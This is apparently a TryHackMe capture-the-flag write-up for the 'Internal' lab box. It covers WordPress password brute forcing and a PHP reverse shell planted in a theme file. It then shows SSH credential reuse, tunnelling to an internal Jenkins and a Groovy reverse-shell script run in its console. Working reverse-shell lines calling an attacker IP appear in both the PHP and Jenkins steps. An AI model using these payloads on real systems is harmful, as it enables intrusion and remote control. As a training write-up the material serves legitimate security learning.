# Internal

Tryhackme Internal - Linux - Hard

https://tryhackme.com/room/internal

## Nmap
```shell
Nmap scan report for internal.thm (10.10.46.201)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As the homepage is just default ubuntu page, we have to search other dir, therefore, `gobuster` is the next tool we will use.

```shell
└──╼ $gobuster dir -u internal.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
...
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
```

On going to blog, we found it is wordpress website.

Therefore, next step is to do `wpscan`.

```shell
└──╼ $wpscan --url http://internal.thm/blog/ --passwords /usr/share/wordlists/rockyou.txt --max-threads 100
...
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

We got username and password, so let's login in wordpress.

In theme editor, we will write our shell in `index.php`

![](https://hackmd.io/_uploads/rJmF_ljU2.png)

`<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.8.95.227/4444 0>&1'"); ?>`

We got the reverse shell... Paste this command to get full TTY.
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Little enumeration to find `user.txt`
```
www-data@internal:/var/www$ cd /home
cd /home

www-data@internal:/home$ ls
ls
aubreanna

www-data@internal:/home$ cd aubreanna
cd aubreanna
bash: cd: aubreanna: Permission denied

www-data@internal:/home$ find / -name user.txt 2>/dev/null 
find / -name user.txt 2>/dev/null
/usr/share/doc/phpmyadmin/html/_sources/user.txt

www-data@internal:/home$ cat /usr/share/doc/phpmyadmin/html/_sources/user.txt
cat /usr/share/doc/phpmyadmin/html/_sources/user.txt
User Guide
==========

.. toctree::
    :maxdepth: 2

    transformations
    privileges
    other
    import_export

www-data@internal:/home$ find / -name *.txt 2>/dev/null       
find / -name *.txt 2>/dev/null
/opt/wp-save.txt
... other files

www-data@internal:/home$ cat /opt/wp-save.txt
cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

So, we get the password for `aubreanna`. Let's login using ssh.
```shell
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt 
THM{int3rna1_fl4g_1}
```

## Privilege Escalation

Let's check for other file

```shell
aubreanna@internal:~$ sudo -l
[sudo] password for aubreanna: 
Sorry, user aubreanna may not run sudo on internal.
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

So jenkins file is running on `8080` port, and we have to forward that to our local machine.

We have to use port forwarding in ssh, we can achieve using the following command.

`└──╼ $ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm`

On entering password, we will get jenkins login page on `localhost:8080`.


After enumerating password from jenkins login form, we got `admin:spongebob`.

In `Manage Jenkins > Script Console` paste this reverse shell and listen via netcat.

```shell
String host="10.8.95.227";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


As as user, go to `/opt` and we will get root password from there.
```shell
$ cd /opt
$ ls
note.txt
$ cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Login using this credentials,
```shell
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt 
THM{d0ck3r_d3str0y3r}
```

